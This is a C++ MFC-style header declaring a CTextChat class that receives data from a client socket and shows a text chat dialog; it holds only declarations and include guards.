// TextChat.h: interface for the CTextChat class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_TEXTCHAT_H__B6BA916D_75B1_4B58_A4D7_EC5BE03830B2__INCLUDED_)
#define AFX_TEXTCHAT_H__B6BA916D_75B1_4B58_A4D7_EC5BE03830B2__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"
class CTextChat  : public CManager  
{
public:
	CTextChat(CClientSocket *pClient);
	virtual ~CTextChat();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	char m_Text[1024*100];	

	HWND hwnd;
	static INT_PTR CALLBACK MyDialogProc(HWND hwndDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
};

#endif // !defined(AFX_TEXTCHAT_H__B6BA916D_75B1_4B58_A4D7_EC5BE03830B2__INCLUDED_)
